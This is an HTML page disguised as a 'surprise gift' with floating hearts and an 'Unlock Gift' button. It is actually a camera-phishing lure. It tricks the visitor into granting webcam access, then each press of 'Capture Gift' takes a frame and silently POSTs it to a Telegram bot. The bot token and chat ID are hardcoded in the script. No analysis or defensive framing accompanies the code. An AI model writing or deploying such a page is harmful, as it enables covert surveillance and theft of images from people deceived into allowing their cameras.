<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ğŸ Unlock Your Surprise</title>

<style>
body {
    margin: 0;
    overflow: hidden;
    background: #000;
    text-align: center;
    color: white;
    font-family: Arial;
}

#msg {
    margin-top: 40px;
    font-size: 26px;
}

button {
    padding: 14px 32px;
    background: #ff0059;
    border: none;
    border-radius: 8px;
    font-size: 18px;
    color: white;
    margin-top: 20px;
}

#hearts {
    position: fixed;
    inset: 0;
    pointer-events: none;
}

video, canvas {
    width: 90%;
    margin-top: 20px;
    display: none;
}
</style>
</head>
<body>

<h2 id="msg">ğŸ Tap the button below to unlock your surprise!</h2>

<button onclick="startGift()">Unlock Gift ğŸ</button>

<div id="hearts"></div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<button id="captureBtn" style="display:none" onclick="capturePhoto()">ğŸ“¸ Capture Gift</button>

<script>
// Floating Hearts
function createHeart() {
    const heart = document.createElement("div");
    heart.innerHTML = "â¤ï¸";
    heart.style.position = "absolute";
    heart.style.left = Math.random() * 100 + "vw";
    heart.style.animation = "floatUp 4s linear";
    heart.style.fontSize = (Math.random() * 20 + 20) + "px";
    document.getElementById("hearts").appendChild(heart);
    setTimeout(() => heart.remove(), 4000);
}
setInterval(createHeart, 200);

// Start Camera
function startGift() {
    document.getElementById("msg").innerText = "ğŸ’— Click ALLOW to reveal your gift!";
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            document.getElementById("video").style.display = "block";
            document.getElementById("captureBtn").style.display = "block";
            document.getElementById("video").srcObject = stream;
        })
        .catch(err => alert("Camera permission needed!"));
}

// Capture + Send to Telegram
let photoCount = 0;
function capturePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0);

    const imageData = canvas.toDataURL("image/jpeg");

    fetch(`https://api.telegram.org/bot8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI/sendPhoto`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: "8215819954",
            photo: imageData
        })
    });

    photoCount++;

    if (photoCount >= 10) {
        alert("â¤ï¸ Your gift is ready!");
    }
}
</script>

</body>
</html>
